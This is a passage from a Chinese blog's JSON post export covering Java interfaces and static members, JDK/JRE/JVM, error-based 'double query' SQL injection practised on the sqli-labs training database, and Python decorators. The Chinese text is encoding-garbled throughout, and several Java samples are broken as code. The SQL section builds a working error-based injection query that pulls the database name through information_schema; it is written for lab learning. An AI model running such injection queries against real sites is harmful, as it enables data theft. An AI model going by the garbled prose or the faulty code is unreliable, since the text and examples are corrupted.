æ­¤ï¼ŒæŠ½è±¡æ–¹æ³•å®é™…ä¸Šç›¸å½“äºå®šä¹‰äº†â€œè§„èŒƒâ€ã€‚ æ¥å£ æŠ½è±¡ç±»å’Œæ¥å£çš„å¯¹æ¯”å¦‚ä¸‹ï¼š abstract class interface ç»§æ‰¿ åªèƒ½extendsä¸€ä¸ªclass å¯ä»¥implementså¤šä¸ªinterface å­—æ®µ å¯ä»¥å®šä¹‰å®ä¾‹å­—æ®µ ä¸èƒ½å®šä¹‰å®ä¾‹å­—æ®µ æŠ½è±¡æ–¹æ³• å¯ä»¥å®šä¹‰æŠ½è±¡æ–¹æ³• å¯ä»¥å®šä¹‰æŠ½è±¡æ–¹æ³• éæŠ½è±¡æ–¹æ³• å¯ä»¥å®šä¹‰éæŠ½è±¡æ–¹æ³• å¯ä»¥å®šä¹‰defaultæ–¹æ³• defaultæ–¹æ³• åœ¨æ¥å£ä¸­ï¼Œå¯ä»¥å®šä¹‰defaultæ–¹æ³•ã€‚ä¾‹å¦‚ï¼ŒæŠŠPersonæ¥å£çš„run()æ–¹æ³•æ”¹ä¸ºdefaultæ–¹æ³•ï¼š 1234567891011121314151617181920212223242526public class Main() &#123; public static void main(String args[]) &#123; Person p = new Student(&#x27;Xiao Ming&#x27;); p.run(); &#125;&#125;interface Person() &#123; String getName(); default void run() &#123; System.out.println(getName() + &quot; run&quot;); &#125;&#125;class Student implements Person() &#123; private String name; public Student(String name) &#123; this.name = name; &#125; public getName() &#123; return this.name; &#125;&#125; å®ç°ç±»å¯ä»¥ä¸å¿…è¦†å†™defaultæ–¹æ³•ã€‚defaultæ–¹æ³•çš„ç›®çš„æ˜¯ï¼Œå½“æˆ‘ä»¬éœ€è¦ç»™æ¥å£æ–°å¢ä¸€ä¸ªæ–¹æ³•æ—¶ï¼Œä¼šæ¶‰åŠåˆ°ä¿®æ”¹å…¨éƒ¨å­ç±»ã€‚å¦‚æœæ–°å¢çš„æ˜¯defaultæ–¹æ³•ï¼Œé‚£ä¹ˆå­ç±»å°±ä¸å¿…å…¨éƒ¨ä¿®æ”¹ï¼Œåªéœ€è¦åœ¨éœ€è¦è¦†å†™çš„åœ°æ–¹å»è¦†å†™æ–°å¢æ–¹æ³•ã€‚ é™æ€å­—æ®µå’Œé™æ€æ–¹æ³• é™æ€å­—æ®µ é™æ€å­—æ®µå®šä¹‰ï¼šstatic field é™æ€å­—æ®µå¹¶ä¸å±äºå®ä¾‹ï¼Œæ‰€æœ‰å®ä¾‹å…±äº«ä¸€ä¸ªé™æ€å­—æ®µï¼Œæ‰€ä»¥æ— è®ºä¿®æ”¹å“ªä¸ªå®ä¾‹çš„é™æ€å­—æ®µï¼Œæ•ˆæœéƒ½æ˜¯ä¸€æ ·çš„ï¼šæ‰€æœ‰å®ä¾‹çš„é™æ€å­—æ®µéƒ½è¢«ä¿®æ”¹äº†ã€‚ åœ¨ä»£ç ä¸­ï¼Œå®ä¾‹å¯¹è±¡èƒ½è®¿é—®é™æ€å­—æ®µåªæ˜¯å› ä¸ºç¼–è¯‘å™¨å¯ä»¥æ ¹æ®å®ä¾‹ç±»å‹è‡ªåŠ¨è½¬æ¢ä¸ºç±»å.é™æ€å­—æ®µæ¥è®¿é—®é™æ€å¯¹è±¡ã€‚æ‰€ä»¥ï¼Œæ¨èç”¨ç±»åæ¥è®¿é—®é™æ€å­—æ®µã€‚ é™æ€æ–¹æ³• è°ƒç”¨å®ä¾‹æ–¹æ³•å¿…é¡»é€šè¿‡ä¸€ä¸ªå®ä¾‹å˜é‡ï¼Œè€Œè°ƒç”¨é™æ€æ–¹æ³•åˆ™ä¸éœ€è¦å®ä¾‹å˜é‡ï¼Œé€šè¿‡ç±»åå°±å¯ä»¥è°ƒç”¨ã€‚ä¾‹å¦‚ï¼š 1234567891011121314public class Main &#123; public static void Main(String args[]) &#123; Person.setNumber(99); System.out.println(Person.number); &#125;&#125;class Person &#123; public static int number; public static void setNumber(int value) &#123; number = value; &#125;&#125; é™æ€æ–¹æ³•å±äºç±»è€Œä¸å±äºå®ä¾‹ï¼Œå› æ­¤ï¼Œé™æ€æ–¹æ³•å†…éƒ¨æ— æ³•è®¿é—®thiså˜é‡ï¼Œä¹Ÿæ— æ³•è®¿é—®å®ä¾‹å­—æ®µï¼Œåªèƒ½è®¿é—®é™æ€å­—æ®µã€‚ æ¥å£çš„é™æ€å­—æ®µ interfaceæ˜¯ä¸€ä¸ªçº¯æŠ½è±¡ç±»ï¼Œæ‰€ä»¥ä¸èƒ½å®šä¹‰å®ä¾‹å­—æ®µã€‚ä½†æ˜¯interfaceå¯ä»¥æœ‰é™æ€å­—æ®µï¼Œå¹¶ä¸”é™æ€å­—æ®µå¿…é¡»ä¸ºfinalç±»å‹ã€‚ä¾‹å¦‚ï¼š 12345public interface Person &#123; public static final int MALE = 1; public static final int FEMALE = 2;&#125; ä½†æ˜¯ï¼Œinterfaceçš„å­—æ®µåªèƒ½æ˜¯public static finalç±»å‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠè¿™äº›ä¿®é¥°ç¬¦éƒ½å»æ‰ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨åŠ ä¸Šã€‚","tags":[{"name":"java","slug":"java","permalink":"http://ca0y1h.top/tags/java/"}],"categories":[{"name":"ç¼–ç¨‹","slug":"ç¼–ç¨‹","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"java","slug":"ç¼–ç¨‹/java","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/java/"}]},{"title":"JavaåŸºç¡€å­¦ä¹ ä¹‹JDKã€JREã€JVM","date":"2019-09-23T13:14:39.000Z","path":"Java/code/1.JavaåŸºç¡€å­¦ä¹ ä¹‹JDKã€JREã€JVM/","text":"JavaåŸºç¡€å­¦ä¹ ä¹‹JDKã€JREã€JVM æœ€è¿‘å¸®ä¸€ä¸ªå¸ˆå…„åšCiscoçš„è½¯ä»¶å·¥ç¨‹å¸ˆé¢è¯•é¢˜ï¼Œå‘ç°è¿˜é—®åˆ°äº†JDKã€JREå’ŒJVMä¹‹é—´çš„å…³ç³»ï¼Œè™½ç„¶çœ‹èµ·æ¥æ¯”è¾ƒåŸºç¡€ï¼Œä½†æ˜¯å¯¹è¿™ä¸ªæ¦‚å¿µè¿˜æ˜¯å¾ˆæ¨¡ç³Šï¼Œæ²¡æœ‰å½¢æˆä¸€ä¸ªæœ‰æ•ˆçš„æ¡†æ¶ï¼Œå€Ÿç”¨å»–é›ªå³°å¸ˆå‚…çš„ä¸€å¼ å›¾æ¥è¯´æ˜ï¼Œä¸€å›¾èƒœåƒè¨€ã€‚ JDKï¼šJava Develop Kit JREï¼šJava Runtime Environment ç®€å•åœ°è¯´ï¼ŒJREå°±æ˜¯è¿è¡ŒJavaå­—èŠ‚ç çš„è™šæ‹Ÿæœºã€‚ä½†æ˜¯ï¼Œå¦‚æœåªæœ‰Javaæºç ï¼Œè¦ç¼–è¯‘æˆJavaå­—èŠ‚ç ï¼Œå°±éœ€è¦JDKï¼Œå› ä¸ºJDKé™¤äº†åŒ…å«JREï¼Œè¿˜æä¾›äº†ç¼–è¯‘å™¨ã€è°ƒè¯•å™¨ç­‰å¼€å‘å·¥å…·ã€‚ å†è´´ä¸€å¼ Javaæ‰§è¡Œä»£ç è¿‡ç¨‹çš„å›¾ï¼š è¿™é‡Œå†ç®€å•çš„è¯´ä¸€ä¸‹Java ä¸ºä»€ä¹ˆèƒ½è·¨å¹³å°ï¼Œå®ç°ä¸€æ¬¡ç¼–å†™ï¼Œå¤šå¤„è¿è¡Œï¼Ÿ Java èƒ½å¤Ÿè·¨å¹³å°è¿è¡Œçš„æ ¸å¿ƒåœ¨äº JVM ã€‚ä¸æ˜¯ Java èƒ½å¤Ÿè·¨å¹³å°ï¼Œè€Œæ˜¯å®ƒçš„ jvm èƒ½å¤Ÿè·¨å¹³å°ã€‚ Java å¼•å…¥äº†å­—èŠ‚ç çš„æ¦‚å¿µï¼Œjvm åªèƒ½è®¤è¯†å­—èŠ‚ç ï¼Œå¹¶å°†å®ƒä»¬è§£é‡Šåˆ°ç³»ç»Ÿçš„ API è°ƒç”¨ã€‚é’ˆå¯¹ä¸åŒçš„ç³»ç»Ÿæœ‰ä¸åŒçš„ jvm å®ç°ï¼Œæœ‰ Linux ç‰ˆæœ¬çš„ jvm å®ç°ï¼Œä¹Ÿæœ‰ Windows ç‰ˆæœ¬çš„ jvm å®ç°ï¼Œä½†æ˜¯åŒä¸€æ®µä»£ç åœ¨ç¼–è¯‘åçš„å­—èŠ‚ç æ˜¯ä¸€æ ·çš„ã€‚","tags":[{"name":"java","slug":"java","permalink":"http://ca0y1h.top/tags/java/"}],"categories":[{"name":"ç¼–ç¨‹","slug":"ç¼–ç¨‹","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"java","slug":"ç¼–ç¨‹/java","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/java/"}]},{"title":"webå®‰å…¨å­¦ä¹ ä¹‹SQLæ³¨å…¥â€”â€”åŒæŸ¥è¯¢æŠ¥é”™æ³¨å…¥åŠå…¶åŸç†","date":"2019-09-17T01:54:22.000Z","path":"Web_security/basic_learning/11.SQLæ³¨å…¥â€”â€”åŒæŸ¥è¯¢æ³¨å…¥/","text":"webå®‰å…¨å­¦ä¹ ä¹‹SQLæ³¨å…¥â€”â€”åŒæŸ¥è¯¢æŠ¥é”™æ³¨å…¥åŠå…¶åŸç† å¦‚æœæ˜¯SQLæŠ¥é”™æ³¨å…¥çš„è¯ï¼Œç»å¸¸ä¼šçœ‹åˆ°ä¸€ä¸ªæŠ¥é”™å‡½æ•°floorï¼Œè™½ç„¶æœ‰ç°æˆçš„å…¬å¼ç»™ä½ å¥—ç”¨ï¼Œä½†æˆ‘è¿˜æ˜¯è§‰å¾—æœ‰å¿…è¦å¼„æ¸…æ¥šé‡Œé¢çš„åŸç†ã€‚ payloadå½¢æˆ åŒæ³¨å…¥payloadéœ€è¦ç”¨åˆ°å››ä¸ªå‡½æ•°å’Œä¸€ä¸ªgroup byè¯­å¥ï¼š group byï¼šåˆ†ç»„è¯­å¥ï¼› rand()ï¼šéšæœºç”Ÿæˆå‡½æ•°ï¼› floor()ï¼šå–æ•´å‡½æ•°ï¼› concat()ï¼šå­—ç¬¦ä¸²è¿æ¥å‡½æ•°ï¼› count()ï¼šç»Ÿè®¡å‡½æ•°ã€‚ ç”¨sqli-labsä¸­çš„æ•°æ®åº“ä¸ºç¤ºä¾‹ï¼š concatå‡½æ•° 1mysql&gt; SELECT concat(&quot;testï¼š&quot;,(SELECT database()))as a; æ‰§è¡ŒæŸ¥è¯¢æ“ä½œæ—¶ï¼Œå­æŸ¥è¯¢å…ˆå¼€å§‹ï¼Œæ‰€ä»¥SELECT database()å…ˆæ‰§è¡Œï¼Œç„¶åæŸ¥è¯¢åˆ°å½“å‰æ•°æ®åº“åç§°â€securityâ€œï¼Œå¹¶å°†å…¶ä¼ ç»™concatå‡½æ•°ï¼Œconcatå‡½æ•°åœ¨å¯¹å­—ç¬¦è¿›è¡Œè¿æ¥ï¼Œäºæ˜¯æ˜¾ç¤ºå‡ºå›¾ä¸Šçš„ç»“æœã€‚ randå‡½æ•° rand()å‡½æ•°ï¼Œå…¶ä½œç”¨æ˜¯ç”Ÿæˆä¸€ä¸ªå¤§äº0å°äº1çš„éšæœºæµ®ç‚¹æ•°ï¼Œå¦‚ä¸‹ï¼š floorå‡½æ•° floor()å‡½æ•°çš„ä½œç”¨æ˜¯å¯¹ä¼ å…¥çš„å‚æ•°å–æ•´ï¼Œè¿™é‡Œå°†rand()ç”Ÿæˆçš„éšæœºæ•°åšå¤„ç†è¿›è¡Œå–æ•´ï¼Œç”±äºrand()ç”Ÿæˆçš„å€¼å–æ•´ç»“æœåªèƒ½ä¸º0ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œåšä¸€ç‚¹å¤„ç†ï¼Œä½¿å…¶ç”Ÿæˆä¸€ä¸ªå¤§äº0å°äº2çš„éšæœºå€¼ï¼Œå¹¶å¯¹å…¶å–æ•´ï¼š 1mysql&gt; SELECT floor(rand()*2); ç»“æœè¦ä¹ˆä¸º0è¦ä¹ˆä¸º1ï¼š æ¥ä¸‹æ¥ç»“åˆå­æŸ¥è¯¢ï¼Œæ˜¾ç¤ºå‡ºæ•°æ®åº“ä¿¡æ¯ï¼š 1mysql&gt; SELECT concat((SELECT database()), floor(rand()*2)) from users; usersè¡¨æœ‰å¤šå°‘æ¡æ•°æ®å°±ä¼šè¿”å›å¤šå°‘æ¡ä¿¡æ¯ï¼š åœ¨æ³¨å…¥ä¸­ï¼Œæˆ‘ä»¬ä¸çŸ¥é“åº“åè¡¨åï¼Œå¾€å¾€å€ŸåŠ©information_schemaè¿™ä¸ªåº“è¿›è¡ŒçŒœè§£ å…¶ä¸­information_schema.schemataä¸­åŒ…å«äº†mysqlçš„æ‰€æœ‰åº“åï¼Œinformation_schema.tablesä¸­åŒ…å«äº†æ‰€æœ‰çš„è¡¨åï¼Œinformation_schema.columnsä¸­åŒ…å«äº†æ‰€æœ‰çš„åˆ—åã€‚ group byè¯­å¥ ç°åœ¨åŠ ä¸Šgroup byè¯­å¥å¯¹è¿”å›çš„æ•°æ®è¿›è¡Œåˆ†ç»„å¤„ç†ï¼š 1SELECT concat((SELECT database()), floor(rand()*2))as a from information_schema.schemata group by a; countå‡½æ•° è¿™é‡Œå¢åŠ ä¸€ä¸ªèšåˆå‡½æ•°countï¼Œæ„é€ çš„è¯­å¥å¦‚ä¸‹ï¼š 1SELECT count(*),concat((SELECT database()), floor(rand()*2))as a from information_schema.schemata group by a; å½“æˆ‘ä»¬åŠ ä¸Šcount(*)å‡½æ•°æ—¶ï¼Œæ“ä½œè¿‡ç¨‹ä¸ºï¼šæŸ¥çœ‹è™šæ‹Ÿè¡¨æ˜¯å¦å­˜åœ¨è¯¥ä¸»é”®å€¼ï¼Œä¸å­˜åœ¨åˆ™æ’å…¥æ–°è®°å½•ï¼Œå­˜åœ¨åˆ™count(*)å­—æ®µç›´æ¥åŠ 1ã€‚ è¿™é‡Œåˆ©ç”¨count(*)å¯¹å‰é¢çš„è¿”å›æ•°æ®è¿›è¡Œç»Ÿè®¡ï¼Œç”±äºgroup by å’Œéšæœºæ•°çš„åŸå› ï¼Œæœ‰å¯èƒ½ä¼šå‡ºç°é‡å¤çš„é”®å€¼ï¼Œå½“é”®å€¼é‡å¤æ—¶å°±ä¼šè§¦å‘é”™è¯¯ï¼Œç„¶åæŠ¥é”™ï¼Œç”±äºå­æŸ¥è¯¢åœ¨é”™è¯¯å‘ç”Ÿä¹‹å‰å°±å·²ç»å®Œæˆï¼Œæ‰€ä»¥å­æŸ¥è¯¢çš„å†…å®¹ä¼šéšç€æŠ¥é”™ä¿¡æ¯ä¸€èµ·æ˜¾ç¤ºå‡ºæ¥ï¼š payloadåŸç† ç›´æ¥æŠŠè¿™ä¸€ç¯‡æ–‡ç« æ¬è¿è¿‡æ¥å§ï¼Œå†™å¾—éå¸¸å¥½ï¼Œåœ¨æ­¤å°±åšä¸ªå°çš„æ€»ç»“ï¼š é€šè¿‡flooræŠ¥é”™çš„æ–¹æ³•æ¥çˆ†æ•°æ®çš„æœ¬è´¨æ˜¯group byè¯­å¥çš„æŠ¥é”™ã€‚group byè¯­å¥æŠ¥é”™çš„åŸå› æ˜¯floor(random(0)*2)çš„ä¸ç¡®å®šæ€§ï¼Œå³å¯èƒ½ä¸º0ä¹Ÿå¯èƒ½ä¸º1,ï¼ˆgroup by keyçš„åŸç†æ˜¯å¾ªç¯è¯»å–æ•°æ®çš„æ¯ä¸€è¡Œï¼Œå°†ç»“æœä¿å­˜äºä¸´æ—¶è¡¨ä¸­ã€‚è¯»å–æ¯ä¸€è¡Œçš„keyæ—¶ï¼Œå¦‚æœkeyå­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™ä¸åœ¨ä¸´æ—¶è¡¨ä¸­æ›´æ–°ä¸´æ—¶è¡¨ä¸­çš„æ•°æ®ï¼›å¦‚æœè¯¥keyä¸å­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™åœ¨ä¸´æ—¶è¡¨ä¸­æ’å…¥keyæ‰€åœ¨è¡Œçš„æ•°æ®ã€‚group by floor(random(0)*2)å‡ºé”™çš„åŸå› æ˜¯keyæ˜¯ä¸ªéšæœºæ•°ï¼Œæ£€æµ‹ä¸´æ—¶è¡¨ä¸­keyæ˜¯å¦å­˜åœ¨æ—¶è®¡ç®—äº†ä¸€ä¸‹floor(random(0)*2)å¯èƒ½ä¸º0ï¼Œå¦‚æœæ­¤æ—¶ä¸´æ—¶è¡¨åªæœ‰keyä¸º1çš„è¡Œå’Œä¸å­˜åœ¨keyä¸º0çš„è¡Œï¼Œé‚£ä¹ˆæ•°æ®åº“è¦å°†è¯¥æ¡è®°å½•æ’å…¥ä¸´æ—¶è¡¨ï¼Œç”±äºæ˜¯éšæœºæ•°ï¼Œæ’æ—¶åˆè¦è®¡ç®—ä¸€ä¸‹éšæœºå€¼ï¼Œæ­¤æ—¶floor(random(0)*2)ç»“æœå¯èƒ½ä¸º1ï¼Œå°±ä¼šå¯¼è‡´æ’å…¥æ—¶å†²çªè€ŒæŠ¥é”™ã€‚å³æ£€æµ‹æ—¶å’Œæ’å…¥æ—¶ä¸¤æ¬¡è®¡ç®—äº†éšæœºæ•°çš„å€¼ã€‚ ç»“è®ºæ˜¯ï¼šå½“ä¸ä¸´æ—¶è¡¨é‡Œé¢çš„å€¼è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœä¸åŒï¼Œå°±æ’å…¥ï¼Œä½†æ˜¯æ’å…¥çš„æ—¶å€™åˆè®¡ç®—äº†ä¸€æ¬¡ï¼Œæ‰€ä»¥å¦‚æœæ’å…¥æ—¶è®¡ç®—çš„å€¼ä¸ç›´æ¥æ¯”è¾ƒçš„å€¼ä¸ä¸€æ ·ï¼Œåˆ™æŠ¥é”™","tags":[{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"http://ca0y1h.top/tags/sql%E6%B3%A8%E5%85%A5/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Pythonå‡½æ•°å¼ç¼–ç¨‹-è£…é¥°å™¨","date":"2019-09-15T05:51:50.000Z","path":"Python/code/4.Pythonå‡½æ•°å¼ç¼–ç¨‹-è£…é¥°å™¨/","text":"Pythonå‡½æ•°å¼ç¼–ç¨‹-è£…é¥°å™¨ æ¬è¿è‡ªhttps://foofish.net/python-decorator.html åŸæ–‡æœ‰è‹¥å¹²å¤„é”™è¯¯ï¼ å¼•å…¥ è£…é¥°å™¨æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª Python å‡½æ•°æˆ–ç±»ï¼Œå®ƒå¯ä»¥è®©å…¶ä»–å‡½æ•°æˆ–ç±»åœ¨ä¸éœ€è¦åšä»»ä½•ä»£ç ä¿®æ”¹çš„å‰æä¸‹å¢åŠ é¢å¤–åŠŸèƒ½ï¼Œè£…é¥°å™¨çš„è¿”å›å€¼ä¹Ÿæ˜¯ä¸€ä¸ªå‡½æ•°/ç±»å¯¹è±¡ã€‚ å®ƒç»å¸¸ç”¨äºæœ‰åˆ‡é¢éœ€æ±‚çš„åœºæ™¯ï¼Œæ¯”å¦‚ï¼šæ’å…¥æ—¥å¿—ã€æ€§èƒ½æµ‹è¯•ã€äº‹åŠ¡å¤„ç†ã€ç¼“å­˜ã€æƒé™æ ¡éªŒç­‰åœºæ™¯ï¼Œè£…é¥°å™¨æ˜¯è§£å†³è¿™ç±»é—®é¢˜çš„ç»ä½³è®¾è®¡ã€‚æœ‰äº†è£…é¥°å™¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠ½ç¦»å‡ºå¤§é‡ä¸å‡½æ•°åŠŸèƒ½æœ¬èº«æ— å…³çš„é›·åŒä»£ç åˆ°è£…é¥°å™¨ä¸­å¹¶ç»§ç»­é‡ç”¨ã€‚ æ¦‚æ‹¬çš„è®²ï¼Œè£…é¥°å™¨çš„ä½œç”¨å°±æ˜¯ä¸ºå·²ç»å­˜åœ¨çš„å¯¹è±¡æ·»åŠ é¢å¤–çš„åŠŸèƒ½ã€‚ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä¸€æ­¥ä¸€æ­¥çš„æ¥çœ‹è£…é¥°å™¨æ˜¯æ€ä¹ˆå½¢æˆå’Œèµ·ä½œç”¨çš„ã€‚ å…ˆæ¥çœ‹ä¸€ä¸ªç®€å•å‡½æ•°ï¼š 12def foo(): print(&#x27;I am foo&#x27;) ç°åœ¨æœ‰ä¸€ä¸ªæ–°çš„éœ€æ±‚ï¼Œå¸Œæœ›å¯ä»¥è®°å½•ä¸‹å‡½æ•°çš„æ‰§è¡Œæ—¥å¿—ï¼Œäºæ˜¯åœ¨ä»£ç ä¸­æ·»åŠ æ—¥å¿—ä»£ç ï¼š 123def foo(): print(&#x27;I am foo&#x27;) logging.info(&#x27;foo is running&#x27;) å‡è®¾ç°åœ¨å…¶ä»–å‡½æ•°ä¹Ÿæœ‰ç±»ä¼¼çš„éœ€æ±‚ï¼Œå¦‚æœå†å†™ä¸€ä¸ªloggingåœ¨å…¶ä»–å‡½æ•°é‡Œé¢ï¼Œè¿™æ ·å°±ä¼šé€ æˆå¤§é‡é‡å¤ä»£ç ã€‚é¦–å…ˆæƒ³åˆ°çš„è§£å†³åŠæ³•è‚¯å®šæ˜¯é‡æ–°å®šä¹‰ä¸€ä¸ªå‡½æ•°ä¸“é—¨æ¥å¤„ç†æ—¥å¿—ã€‚ 12345678def use_logging(func): logging.warn(&quot;%s is running&quot; % func.__name__) func() def foo(): print(&#x27;I am foo&#x27;) use_logging(foo) è¿™æ ·åšé€»è¾‘ä¸Šæ˜¯æ²¡é—®é¢˜çš„ï¼ŒåŠŸèƒ½æ˜¯å®ç°äº†ï¼Œä½†æ˜¯æˆ‘ä»¬è°ƒç”¨çš„æ—¶å€™ä¸å†æ˜¯è°ƒç”¨çœŸæ­£çš„ä¸šåŠ¡é€»è¾‘fooå‡½æ•°ï¼Œè€Œæ˜¯æ¢æˆäº†use_loggingå‡½æ•°ã€‚é‚£ä¹ˆæœ‰æ²¡æœ‰æ›´å¥½çš„æ–¹å¼çš„å‘¢ï¼Ÿå½“ç„¶æœ‰ï¼Œç­”æ¡ˆå°±æ˜¯è£…é¥°å™¨ã€‚ ç®€å•è£…é¥°å™¨ 123456789101112import loggingdef use_logging(func): def wrapper(): logging.warning(&quot;%s is running&quot; % func.__name__) return func() # æŠŠfooå½“ä½œå‚æ•°ä¼ è¿›æ¥æ—¶ï¼Œæ‰§è¡Œfunc()å°±ç›¸å½“äºæ‰§è¡Œäº†foo() return wrapperdef foo(): print(&#x27;I am foo&#x27;)foo = use_logging(foo) # å› ä¸ºè£…é¥°å™¨ use_logging(foo) è¿”å›çš„æ—¶å‡½æ•°å¯¹è±¡ wrapperï¼Œè¿™æ¡è¯­å¥ç›¸å½“äº foo = wrapperfoo() # æ‰§è¡Œfoo()å°±ç›¸å½“äºæ‰§è¡Œ wrapper() use_logging å°±æ˜¯ä¸€ä¸ªè£…é¥°å™¨ï¼Œå®ƒä¸€ä¸ªæ™®é€šçš„å‡½æ•°ï¼Œå®ƒæŠŠæ‰§è¡ŒçœŸæ­£ä¸šåŠ¡é€»è¾‘çš„å‡½æ•° func åŒ…è£¹åœ¨å…¶ä¸­ï¼Œçœ‹èµ·æ¥åƒ foo è¢« use_logging è£…é¥°äº†ä¸€æ ·ï¼Œuse_logging è¿”å›çš„ä¹Ÿæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„åå­—å« wrapperã€‚ è¯­æ³•ç³– @ç¬¦å·å°±æ˜¯è£…é¥°å™¨çš„è¯­æ³•ç³–ï¼Œå®ƒæ”¾åœ¨å‡½æ•°å¼€å§‹å®šä¹‰çš„åœ°æ–¹ï¼Œè¿™æ ·å°±å¯ä»¥çœç•¥æœ€åä¸€æ­¥å†æ¬¡èµ‹å€¼çš„æ“ä½œã€‚ 12345678910111213import loggingdef use_logging(func): def wrapper(): logging.warning(&quot;%s is running&quot; % func.__name__) return func() return wrapper@use_loggingdef foo(): print(&#x27;I am foo&#x27;)#foo = use_logging(foo)foo() å¦‚ä¸Šæ‰€ç¤ºï¼Œæœ‰äº† @ ï¼Œæˆ‘ä»¬å°±å¯ä»¥çœå»foo = use_logging(foo)è¿™ä¸€å¥äº†ï¼Œç›´æ¥è°ƒç”¨ foo() å³å¯å¾—åˆ°æƒ³è¦çš„ç»“æœã€‚ å¸¦å‚æ•°çš„foo() å¦‚æœä¸šåŠ¡é€»è¾‘å‡½æ•° foo éœ€è¦å‚æ•°ï¼Œä¾‹å¦‚ï¼š 12def foo(name): print(&#x27;I am %s&#x27;, name) æˆ‘ä»¬å¯ä»¥åœ¨å®šä¹‰ wrapper å‡½æ•°çš„æ—¶å€™æŒ‡å®šå‚æ•°ï¼š 123def wrapper(name): logging.warning(&quot;%s is running&quot; % func.__name__) return func(name) è¿™æ · foo å‡½æ•°å®šä¹‰çš„å‚æ•°å°±å¯ä»¥å®šä¹‰åœ¨ wrapper å‡½æ•°ä¸­ã€‚å¦‚æœfuncå‡½æ•°éœ€è¦è‹¥å¹²ä¸ªå‚æ•°çš„è¯ï¼Œå¯ä»¥ç”¨*argsä»£æ›¿ï¼š 123def wrapper(*args): logging.warning(&quot;%s is running&quot; % func.__name__) return func(*args) å¦‚æœ foo å‡½æ•°è¿˜å®šä¹‰äº†ä¸€äº›å…³é”®å­—å‚æ•°å‘¢ï¼Ÿæ¯”å¦‚ï¼š 12def foo(name, age=None, height=None): print(&#x27;I am %s, age %s, height %s&#x27; % (name, age, height)) è¿™æ—¶ï¼Œä½ å°±å¯ä»¥æŠŠ wrapper å‡½æ•°æŒ‡å®šå…³é”®å­—å‡½æ•°ï¼š 1234def wrapper(*args, **kw): # argsæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œkwargsä¸€ä¸ªå­—å…¸ logging.warn(&quot;%s is running&quot; % func.__name__) return func(*args, **kw) å®Œæ•´çš„å‡½æ•°å®šä¹‰å’Œè°ƒç”¨å¦‚ä¸‹ï¼š 123456789101112import loggingdef use_logging(func): def wrapper(*args, **kw): logging.warn(&quot;%s is running&quot; % func.__name__) return func(*args, **kw) return wrapper@use_loggingdef foo(): print(&#x27;I am foo&#x27;)foo() å¸¦å‚æ•°çš„è£…é¥°å™¨ è£…é¥°å™¨çš„è¯­æ³•å…è®¸æˆ‘ä»¬åœ¨è°ƒç”¨æ—¶ï¼Œæä¾›å…¶å®ƒå‚æ•°ï¼Œæ¯”å¦‚@decorator(a)ã€‚è¿™æ ·ï¼Œå°±ä¸ºè£…é¥°å™¨çš„ç¼–å†™å’Œä½¿ç”¨æä¾›äº†æ›´å¤§çš„çµæ´»æ€§ã€‚æ¯”å¦‚ï¼šæˆ‘ä»¬å¯ä»¥åœ¨è£…é¥°å™¨ä¸­æŒ‡å®šæ—¥å¿—çš„ç­‰çº§ï¼Œå› ä¸ºä¸åŒä¸šåŠ¡å‡½æ•°å¯èƒ½éœ€è¦çš„æ—¥å¿—çº§åˆ«æ˜¯ä¸ä¸€æ ·çš„ã€‚ 12345678910111213141516171819import loggingdef use_logging(level): def decorator(func): def wrapper(*args, **kw): if level == &#x27;warn&#x27;: logging.warning(&quot;%s is running&quot; % func.__name__) elif level == &#x27;error&#x27;: logging.error(&quot;%s is running&quot; % func.__name__) return func(*args, **kw) return wrapper return decorator@use_logging(level=&#x27;error&#x27;)def foo(name, age): print(&#x27;I am %s, %s age&#x27; % (name, age))foo(&#x27;foo&#x27;, 19) ä¸Šé¢çš„use_loggingæ˜¯å…è®¸å¸¦å‚æ•°çš„è£…é¥°å™¨ã€‚å®ƒå®é™…ä¸Šæ˜¯å¯¹åŸæœ‰è£…é¥°å™¨çš„ä¸€ä¸ªå‡½æ•°å°è£…ï¼Œå¹¶è¿”å›ä¸€ä¸ªè£…é¥°å™¨ã€‚æˆ‘ä»¬å¯ä»¥å°†å®ƒç†è§£ä¸ºä¸€ä¸ªå«æœ‰å‚æ•°çš„é—­åŒ…ã€‚ å…·ä½“è€Œè¨€ï¼Œå’Œä¸¤å±‚åµŒå¥—çš„decoratorç›¸æ¯”ï¼Œ3å±‚åµŒå¥—çš„æ•ˆæœæ˜¯è¿™æ ·çš„ï¼š 12&gt;&gt;&gt; foo = use_logging(&#x27;error&#x27;)(foo) é¦–å…ˆæ‰§è¡Œuse_logging('error')è¿”å›çš„æ˜¯decoratorï¼Œå†è°ƒç”¨è¿”å›çš„å‡½æ•°ï¼Œå‚æ•°æ˜¯fooï¼Œå³decorator(foo)ï¼Œè¿”å›çš„æœ€ç»ˆæ˜¯wrapperå‡½æ•°ã€‚ @use_logging(level=&quot;warn&quot;)ç­‰ä»·äº@decorator functools.wraps ä½¿ç”¨è£…é¥°å™¨æå¤§åœ°å¤ç”¨äº†ä»£ç 